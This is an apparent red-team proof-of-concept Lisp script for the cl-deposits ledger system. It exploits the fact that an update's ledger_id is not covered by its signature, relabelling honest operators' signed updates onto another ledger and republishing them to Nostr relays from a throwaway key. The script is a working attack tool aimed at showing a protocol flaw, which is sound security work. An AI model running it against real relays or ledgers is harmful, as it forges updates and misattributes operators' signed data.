;;;; redteam/relabel.lisp — republish an operator's honest updates under another ledger's id.
;;;;   sbcl --non-interactive --load redteam/relabel.lisp -- SOURCE-LEDGER-FILE TARGET-LEDGER-HEX [SEQ...]
;;;;   env: CLD_RELAYS
;;;; An update's ledger_id is covered by neither its content hash nor its operator
;;;; signature (DEP-02 §Signing), so the relabelled copy still verifies.  Published
;;;; from a throwaway key: anyone can do this.  Prints what it published, one plist
;;;; per update, and (:skipped ...) for updates signed by someone other than the
;;;; target's operator.  With no SEQs, every update in the source file.
(require :asdf)
(handler-bind ((warning #'muffle-warning)) (asdf:load-system "cl-deposits"))
(let* ((args (cdr (member "--" sb-ext:*posix-argv* :test #'string=)))
       (source (first args)) (target (cl-deposits.util:hex->bytes (second args)))
       (seqs (mapcar #'parse-integer (cddr args)))
       (updates (mapcar (lambda (b64) (cl-deposits.update:decode-update (cl-deposits.util:base64-decode b64)))
                        (coerce (json-simple:parse (uiop:read-file-string source)) 'list)))
       (bus (cl-deposits.nostr-bus:make-nostr-bus
             (uiop:split-string (or (uiop:getenv "CLD_RELAYS") "ws://127.0.0.1:7777") :separator ",")))
       (keypair (cl-deposits.wire:nostr-keypair (cl-deposits.util:be->int (cl-deposits.node::random-aux))))
       (*print-pretty* nil))
  (cl-deposits.nostr-bus:wait-for-bus bus)
  (dolist (u updates)
    (when (or (null seqs) (member (cl-deposits.update:update-seq u) seqs))
      (let ((from (cl-deposits.util:bytes->hex (cl-deposits.update:update-ledger-id u))))
        (setf (cl-deposits.update:update-ledger-id u) target)
        (let ((e (cl-deposits.bus:bus-publish bus (cl-deposits.wire:update-event keypair u))))
          (format t "~s~%" (list :published :seq (cl-deposits.update:update-seq u) :from (subseq from 0 16)
                                 :operator (subseq (cl-deposits.util:bytes->hex (cl-deposits.update:update-operator-id u)) 0 16)
                                 :signature-verifies (and (cl-deposits.update:verify-operator-signature u) t)
                                 :event (cl-nostr.event:event-id e)))))))
  (sleep 3)
  (cl-deposits.nostr-bus:close-nostr-bus bus))
